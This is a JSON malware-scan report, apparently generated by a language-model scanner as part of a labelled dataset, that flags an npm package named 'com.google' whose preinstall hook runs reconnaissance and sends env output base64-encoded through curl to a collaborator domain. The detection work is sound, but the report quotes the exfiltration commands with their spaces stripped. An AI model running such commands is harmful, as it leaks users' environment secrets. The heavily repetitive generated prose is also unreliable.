@@ -1,0 +1,86 @@
+{
+  "package_name": "com.google",
+  "version": "0.0.0",
+  "scan_timestamp": "2026-03-27T14:47:15.658774",
+  "final_verdict": {
+    "classification": "MALICIOUS",
+    "confidence": 0.8,
+    "risk_level": "CRITICAL"
+  },
+  "executive_summary": "The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information. The detected behaviors have no legitimate justification based on the package's stated purpose.",
+  "threat_profile": {
+    "attack_type": "Credential Theft",
+    "primary_tactics": [
+      "Exfiltration (Network)",
+      "Discovery (System)",
+      "Credential Access"
+    ],
+    "severity_factors": [
+      "The package.json scripts.preinstall hook is executing commands related to network analysis and exfiltration.",
+      "The package.json scripts.preinstall hook is executing commands related to system reconnaissance.",
+      "The package.json scripts.preinstall hook is executing commands related to credential theft."
+    ],
+    "attack_vector_iocs": [
+      "ping-c1$BCNET",
+      "psaux",
+      "foriinenv",
+      "psaux",
+      "docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)"
+    ]
+  },
+  "evidence_summary": {
+    "malicious_indicators": [
+      {
+        "type": "Network Exfiltration",
+        "description": "The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain.",
+        "severity": "HIGH",
+        "command": "ping-c1$BCNET"
+      },
+      {
+        "type": "System Reconnaissance",
+        "description": "The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment.",
+        "severity": "HIGH",
+        "command": "foriinenv"
+      },
+      {
+        "type": "Credential Theft",
+        "description": "The hook is executing commands that involve credential theft. It appears to be accessing sensitive information.",
+        "severity": "HIGH",
+        "command": "docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)"
+      }
+    ],
+    "behavioral_chain": "The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information.",
+    "legitimacy_assessment": "The package.json scripts.preinstallhook is not justifiable based on the provided evidence."
+  },
+  "recommendations": {
+    "immediate_action": "DO NOT INSTALL — Remove immediately if already installed",
+    "remediation_steps": [
+      "Review package source code and dependencies",
+      "Check for unauthorized access to credentials or secrets",
+      "Monitor network traffic for suspicious outbound connections",
+      "Report to npm security team if confirmed malicious"
+    ]
+  },
+  "detailed_analysis": {
+    "semantic_detection": {
+      "behaviors_found": 3,
+      "categories": [
+        "network_exfiltration",
+        "system_reconnaissance",
+        "credential_theft"
+      ],
+      "highest_confidence": 0.83
+    },
+    "verification_analysis": {
+      "chain_narrative": "The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information.",
+      "chain_score": 0.78,
+      "legitimacy_mismatch": true,
+      "verification_available": true
+    }
+  },
+  "metadata": {
+    "analysis_version": "semantic_v2.0",
+    "model": "deepseek-coder-6.7b-instruct",
+    "ground_truth_label": "malicious"
+  }
+}
